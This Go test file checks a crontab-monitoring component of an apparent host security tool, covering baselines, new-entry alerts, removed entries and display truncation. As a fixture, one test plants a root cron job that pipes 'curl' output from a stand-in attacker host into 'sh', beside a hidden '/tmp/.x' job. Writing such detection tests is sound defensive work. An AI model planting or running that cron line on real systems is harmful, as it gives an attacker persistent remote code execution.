package crontabs

import (
	"slices"
	"strings"
	"testing"

	"github.com/thyarles/lhc-go/internal/check"
	"github.com/thyarles/lhc-go/internal/checktest"
)

const etcCrontab = `# /etc/crontab: system-wide crontab
SHELL=/bin/sh

# m h dom mon dow user  command
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
`

func newEnv(t *testing.T) *checktest.Env {
	e := checktest.NewEnv(t, Check{}, nil)
	e.Fake.File("/etc/crontab", etcCrontab)
	e.Fake.File("/etc/cron.d/backup", "  # indented comment\n30 2 * * * root /usr/local/bin/backup\n   \n")
	e.Fake.File("/etc/cron.d/.placeholder", "* * * * * root /should/not/count\n")
	e.Fake.File("/var/spool/cron/crontabs/alice", "@reboot /home/alice/start.sh\n")
	return e
}

func TestFirstRunRecordsTheBaseline(t *testing.T) {
	e := newEnv(t)
	s := e.Run(Check{})
	checktest.NoAlerts(t, s)
	if got := checktest.Rows(s)["Baseline"].Value; got != "4 crontab entries recorded (first run)" {
		t.Fatalf("Baseline = %q", got)
	}
	var saved []string
	if !e.Loaded(t, stateKey, &saved) {
		t.Fatal("baseline not saved")
	}
	want := []string{
		"/etc/cron.d/backup: 30 2 * * * root /usr/local/bin/backup",
		"/etc/crontab: 17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly",
		"/etc/crontab: SHELL=/bin/sh",
		"/var/spool/cron/crontabs/alice: @reboot /home/alice/start.sh",
	}
	if !slices.Equal(saved, want) {
		t.Fatalf("saved:\n%q\nwant:\n%q", saved, want)
	}
}

func TestUnchangedCrontabsAreOK(t *testing.T) {
	e := newEnv(t)
	e.Run(Check{})
	s := e.Run(Check{})
	checktest.NoAlerts(t, s)
	if got := checktest.Rows(s)["Crontab Changes"]; got.Status != check.OK || got.Value != "None (4 entries)" {
		t.Fatalf("Crontab Changes row: %+v", got)
	}
}

func TestANewEntryAlerts(t *testing.T) {
	e := newEnv(t)
	e.Run(Check{})
	e.Fake.File("/var/spool/cron/root", "*/5 * * * * curl -s http://evil.example | sh\n* * * * * /tmp/.x\n")
	s := e.Run(Check{})
	// One alert for the set, not one identical line per entry.
	if got := s.AlertMsgs(); !slices.Equal(got, []string{"New crontab entry detected"}) {
		t.Fatalf("alerts: %q", got)
	}
	var news []string
	for _, r := range s.Rows {
		if r.Label == "NEW" {
			if r.Status != check.Caution {
				t.Errorf("NEW row not CAUTION: %+v", r)
			}
			news = append(news, r.Value)
		}
	}
	if len(news) != 2 || !strings.HasPrefix(news[0], "/var/spool/cron/root: ") {
		t.Fatalf("NEW rows: %q", news)
	}
	if !slices.Contains(checktest.Labels(s), "New Crontab Entries") {
		t.Fatal("no separator")
	}
}

func TestARemovedEntryIsInformational(t *testing.T) {
	e := newEnv(t)
	e.Seed(t, stateKey, []string{
		"/etc/cron.d/backup: 30 2 * * * root /usr/local/bin/backup",
		"/etc/cron.d/old: 0 0 * * * root /opt/old/job",
		"/etc/crontab: 17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly",
		"/etc/crontab: SHELL=/bin/sh",
		"/var/spool/cron/crontabs/alice: @reboot /home/alice/start.sh",
	})
	s := e.Run(Check{})
	checktest.NoAlerts(t, s)
	if got := checktest.Rows(s)["GONE"]; got.Status != check.Info || got.Value != "/etc/cron.d/old: 0 0 * * * root /opt/old/job" {
		t.Fatalf("GONE row: %+v", got)
	}
	if s.Status != check.Info {
		t.Fatalf("status = %v", s.Status)
	}
}

func TestLongEntriesAreTruncatedForDisplay(t *testing.T) {
	e := checktest.NewEnv(t, Check{}, nil)
	e.Seed(t, stateKey, []string{})
	e.Fake.File("/etc/crontab", "* * * * * root /bin/echo "+strings.Repeat("é", 200)+"\n")
	s := e.Run(Check{})
	if got := []rune(checktest.Rows(s)["NEW"].Value); len(got) != 100 {
		t.Fatalf("NEW row is %d characters", len(got))
	}
}

func TestUnreadableSourcesAreSkipped(t *testing.T) {
	// Without root /var/spool/cron cannot be read; report what is visible.
	e := checktest.NewEnv(t, Check{}, nil)
	e.Fake.File("/etc/crontab", "0 1 * * * root /bin/true\n")
	e.Fake.Unreadable("/var/spool/cron/root")
	s := e.Run(Check{})
	if got := checktest.Rows(s)["Baseline"].Value; got != "1 crontab entries recorded (first run)" {
		t.Fatalf("Baseline = %q", got)
	}
}
